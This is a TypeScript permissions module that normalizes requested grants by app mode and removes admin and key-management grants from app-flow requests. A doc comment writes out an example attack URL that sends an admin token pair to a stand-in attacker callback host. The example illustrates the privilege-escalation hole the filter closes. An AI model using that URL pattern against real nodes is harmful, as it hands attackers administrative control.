import { AppMode } from '../types/flows';

const REQUIRED_PERMISSIONS: Record<AppMode, string[]> = {
  'single-context': ['context:execute'],
  'multi-context': ['context:list', 'context:create', 'context:execute'],
  admin: ['admin'],
};

const ensureUniqueOrder = (values: string[]): string[] => {
  const seen = new Set<string>();
  const result: string[] = [];

  for (const value of values) {
    const trimmed = value.trim();
    if (!trimmed || seen.has(trimmed)) {
      continue;
    }
    seen.add(trimmed);
    result.push(trimmed);
  }

  return result;
};

export const normalizePermissions = (
  mode: AppMode | string | null | undefined,
  permissions: string[],
): string[] => {
  const normalizedMode = (mode || '').toLowerCase() as AppMode;
  const required = REQUIRED_PERMISSIONS[normalizedMode] || [];

  return ensureUniqueOrder([...required, ...permissions]);
};



/**
 * Grants that amount to controlling the node itself: `admin`, and the `keys`
 * family (mint new root/client keys, rewrite any key's permissions — i.e.
 * self-escalate to admin).
 *
 * ⚠️ Only the admin flow may mint these. The package and application-id flows
 * forward `?permissions=` from the URL, and a package's registry-declared
 * frontend is a trusted callback (callbackUrl.ts) — so passing these through
 * let anyone who can publish a package do
 *
 *   ?package-name=com.evil.x&callback-url=https://evil.example&permissions=admin
 *
 * and walk off with an admin token pair after one "Approve". No app needs
 * them: mero-react's getPermissionsForMode never requests either outside
 * AppMode.Admin, which logs in through the admin flow.
 */
const isNodeControlPermission = (permission: string): boolean => {
  const p = permission.trim().toLowerCase();
  return p === 'admin' || p.startsWith('admin[') || p === 'keys' || p.startsWith('keys:') || p.startsWith('keys[');
};

/** Drop node-control grants from a request made by an app (non-admin) flow. */
export const restrictToAppPermissions = (permissions: string[]): string[] => {
  const dropped = permissions.filter(isNodeControlPermission);
  if (dropped.length > 0) {
    console.warn('Dropping node-control permissions requested by an app flow:', dropped);
  }
  return permissions.filter((p) => !isNodeControlPermission(p));
};
